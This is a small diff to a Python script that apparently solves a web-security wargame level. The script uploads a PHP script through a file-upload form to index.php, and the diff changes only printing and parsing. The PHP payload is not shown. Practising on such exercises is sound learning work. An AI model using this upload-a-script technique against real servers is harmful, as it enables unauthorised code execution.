@@ -21,7 +21,7 @@ print(f'{div_content}\n')
 # get the source code
 response = session.get(URL + 'index-source.html')
 source = html.unescape(response.text).replace('<br />', '')
-print(source)
+# print(source)
 """
 <? 
 
@@ -98,5 +98,7 @@ files = {
     "uploadedfile" : bytearray(php_script, 'utf-8')
 }
 # reference: https://stackoverflow.com/questions/22567306/python-requests-file-upload
+# reference: https://stackoverflow.com/questions/24555949/difference-between-data-and-files-in-python-requests
 response = session.post(URL + 'index.php', files=files, data=data)
-print(response.text)
+div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
+print(f'{div_content}\n')
